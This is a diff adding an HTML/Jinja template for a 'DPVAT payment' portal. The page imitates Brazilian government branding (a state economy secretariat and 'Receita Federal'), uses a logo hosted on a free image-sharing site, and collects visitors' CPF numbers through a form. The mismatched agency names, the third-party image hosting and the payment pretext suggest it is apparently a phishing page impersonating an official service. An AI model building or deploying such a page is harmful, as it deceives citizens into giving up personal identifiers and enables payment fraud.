@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal DPVAT - Pagamento</title>
+
+    <!-- Preload fonts -->
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-700.woff2') }}" as="font" type="font/woff2" crossorigin>
+
+    <!-- Styles -->
+    <link href="{{ url_for('static', filename='css/rawline.css') }}" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'rawline', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'custom-blue': '#225BAC',
+                        'custom-yellow': '#F7CD04',
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col">
+    <!-- Header -->
+    <div class="bg-white py-4">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center text-center">
+                <img src="https://i.ibb.co/7RG7SfZ/MEAssinatura-1.png" alt="Logo of Secretaria de Estado de Economia" class="h-8 mb-2" />
+                <div>
+                    <p class="text-black text-[10px] leading-tight">
+                        SECRETARIA DE ESTADO DE ECONOMIA
+                    </p>
+                    <p id="state-text" class="text-black text-[10px] leading-tight font-bold">
+                        Receita Federal - Distrito Federal
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Blue bar -->
+    <div class="bg-custom-blue py-3 shadow-md">
+        <div class="container mx-auto px-4 flex items-center">
+            <button class="text-white text-2xl mr-4">
+                <div class="grid grid-cols-2 gap-0.5 drop-shadow-sm">
+                    <div class="w-2 h-2 bg-white"></div>
+                    <div class="w-2 h-2 bg-white"></div>
+                    <div class="w-2 h-2 bg-white"></div>
+                    <div class="w-1.5 h-1.5 bg-white"></div>
+                </div>
+            </button>
+            <span class="text-white text-xl drop-shadow-sm">PAGAMENTO DPVAT</span>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container mx-auto px-4 py-8">
+        <div class="max-w-md mx-auto bg-white rounded-lg shadow-md p-6">
+            <form id="cpfForm" action="{{ url_for('validar_cpf') }}" method="POST">
+                <div class="mb-6">
+                    <label class="block text-gray-700 text-sm font-bold mb-2" for="cpf">
+                        Digite seu CPF:
+                    </label>
+                    <div class="relative">
+                        <input class="appearance-none border rounded w-full py-3 px-4 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
+                               id="cpf"
+                               name="cpf"
+                               type="text"
+                               maxlength="14"
+                               placeholder="000.000.000-00"
+                               required />
+                        <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
+                            <i class="fas fa-id-card text-gray-500"></i>
+                        </div>
+                    </div>
+                    <p class="text-gray-600 text-xs mt-1">Digite apenas números. A formatação será automática.</p>
+                </div>
+
+                <button type="submit" class="bg-custom-blue text-white font-bold py-3 px-4 rounded w-full hover:bg-opacity-90 transition-colors">
+                    Continuar
+                </button>
+            </form>
+
+            {% with messages = get_flashed_messages() %}
+                {% if messages %}
+                    {% for message in messages %}
+                        <div class="mt-4 bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative" role="alert">
+                            <span class="block sm:inline">{{ message }}</span>
+                        </div>
+                    {% endfor %}
+                {% endif %}
+            {% endwith %}
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="bg-custom-blue text-white text-center py-3 mt-auto">
+        <p class="text-sm">© Secretaria de Estado de Economia. Todos os direitos reservados.</p>
+    </div>
+
+    <script>
+        document.getElementById('cpf').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length <= 11) {
+                value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, function(regex, arg1, arg2, arg3, arg4) {
+                    if (arg4) return `${arg1}.${arg2}.${arg3}-${arg4}`;
+                    if (arg3) return `${arg1}.${arg2}.${arg3}`;
+                    if (arg2) return `${arg1}.${arg2}`;
+                    return arg1;
+                });
+                e.target.value = value;
+            }
+        });
+    </script>
+</body>
+</html>
